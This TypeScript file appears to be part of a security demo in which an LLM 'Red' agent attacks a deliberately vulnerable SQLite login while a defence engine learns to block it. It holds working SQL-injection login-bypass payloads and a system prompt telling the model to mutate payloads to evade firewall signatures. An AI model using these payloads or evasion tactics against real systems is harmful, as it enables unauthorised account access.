/**
 * The Red team's autonomous attacker. OWNER: demo.
 *
 * This is the "Red" half of Red vs Blue: an LLM that mutates its SQL-injection payload
 * in response to what the Blue engine did to its last attempt. It runs through the same
 * Shield as any other traffic, so watching it fight the defence live is the demo.
 *
 * Like the Analyst, it must survive with no Cloudflare login. When Workers AI is
 * unavailable it falls back to a scripted mutation ladder — the same payloads a human
 * red-teamer would try, in the same order — so the adversarial loop still runs offline.
 */

import type { Env } from '../types';

export const RED_MODEL = '@cf/meta/llama-3.3-70b-instruct-fp8-fast';

export interface AttackHistory {
	payload: string;
	result: string;
}

export interface RedMove {
	thought: string;
	payload: string;
	/** Set when this came from the offline ladder rather than the model. */
	source: 'workers-ai' | 'scripted';
}

const RED_SYSTEM_PROMPT = `You are an autonomous red-team agent in a sanctioned security exercise against a deliberately vulnerable practice target you are authorized to test. Your objective is to log in as 'admin' via SQL injection.

The target is a SQLite-backed login. The POST body carries URL-encoded 'username' and 'password'. The backend builds:
  SELECT * FROM users WHERE username = '<username>' AND password = 'wrong'
So your payload goes in the username field and must comment out or satisfy the trailing password clause. Use SQLite syntax: '--' (with a trailing space) or '/* */' for comments; '#' is NOT a SQLite comment and will error.

Adapt to feedback on your previous attempt:
- 'breached': you bypassed the firewall. Repeat the SAME payload once to test whether the defence adapts.
- 'blocked': the firewall learned your signature. Mutate to evade it — change the tautology (OR 2=2, OR 'a'='a'), alter spacing or comments (/**/), change case, or use a different bypass shape (UNION SELECT, stacked quotes). Keep it valid SQLite that still logs in as admin.
- 'rejected'/'error': the injection did not work; try a structurally different bypass.

Output exactly one JSON object, no markdown or backticks:
{"thought":"one sinister sentence on why this mutation","payload":"the exact username-field injection, e.g. admin' OR 1=1 -- "}`;

/**
 * Offline mutation ladder. Each rung is a real SQLite login bypass, ordered so that a
 * signature learned from one rung does not trivially catch the next — which is the whole
 * point of showing an adaptive attacker.
 */
const SCRIPTED_LADDER: { thought: string; payload: string }[] = [
	{ thought: 'Open with the textbook tautology and see if anything is watching.', payload: "admin' OR 1=1 -- " },
	{ thought: 'They signatured 1=1, so I shift the tautology to a different constant.', payload: "admin' OR 2=2 -- " },
	{ thought: 'Numbers are being caught; a string tautology reads differently to a regex.', payload: "admin' OR 'a'='a' -- " },
	{ thought: 'I hide the operator inside inline comments to break their token spacing.', payload: "admin'/**/OR/**/'x'='x'-- " },
	{ thought: 'Abandon the tautology entirely and forge the admin row with a UNION.', payload: "x' UNION SELECT 1,'admin','x','admin' -- " },
	{ thought: 'Fall back to simply commenting out the password check on the admin row.', payload: "admin' -- " },
];

function scriptedMove(history: AttackHistory[]): RedMove {
	// Advance one rung per prior attempt, but if the last shot breached, repeat it once to
	// prove the defence either adapts or does not — exactly what the prompt asks the model.
	const last = history[history.length - 1];
	if (last && last.result === 'breached') {
		const rung = SCRIPTED_LADDER.find((r) => r.payload === last.payload);
		if (rung && !history.slice(0, -1).some((h) => h.payload === last.payload)) {
			return { thought: 'That bypass worked — firing it again to test whether the firewall has since adapted.', payload: last.payload, source: 'scripted' };
		}
	}
	const tried = new Set(history.map((h) => h.payload));
	const next = SCRIPTED_LADDER.find((rung) => !tried.has(rung.payload));
	return { ...(next ?? SCRIPTED_LADDER[SCRIPTED_LADDER.length - 1]), source: 'scripted' };
}

function parseModelMove(raw: unknown): { thought: string; payload: string } | null {
	let value: unknown = raw;
	if (value && typeof value === 'object' && 'response' in value) value = (value as { response: unknown }).response;
	if (typeof value === 'string') {
		try {
			value = JSON.parse(value.trim().replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/, ''));
		} catch {
			return null;
		}
	}
	if (value && typeof value === 'object' && 'payload' in value && typeof (value as { payload: unknown }).payload === 'string') {
		const v = value as { thought?: unknown; payload: string };
		const payload = v.payload.slice(0, 512);
		if (!payload.trim()) return null;
		return { thought: typeof v.thought === 'string' ? v.thought.slice(0, 300) : 'Mutating the injection to evade the current signature.', payload };
	}
	return null;
}

/**
 * Ask the model for the next payload, falling back to the scripted ladder on any failure.
 * Never throws: the Red console must always have a move to make, with or without a login.
 */
export async function generateAttackPayload(env: Env, history: AttackHistory[]): Promise<RedMove> {
	if (!env.AI) return scriptedMove(history);

	const messages: { role: string; content: string }[] = [{ role: 'system', content: RED_SYSTEM_PROMPT }];
	messages.push({
		role: 'user',
		content: history.length
			? `History of your attempts:\n${history.map((h, i) => `Attempt ${i + 1}: payload ${h.payload} -> ${h.result}`).join('\n')}\n\nGenerate your next payload.`
			: 'This is your first attempt. Generate your initial payload.',
	});

	try {
		const response = await env.AI.run(RED_MODEL, { messages, max_tokens: 300, temperature: 0.8, stream: false });
		const move = parseModelMove(response);
		if (move) return { ...move, source: 'workers-ai' };
		console.warn('[red-agent] unparseable model output; using scripted ladder');
	} catch (error) {
		console.warn(`[red-agent] model unavailable (${(error as Error).message}); using scripted ladder`);
	}
	return scriptedMove(history);
}
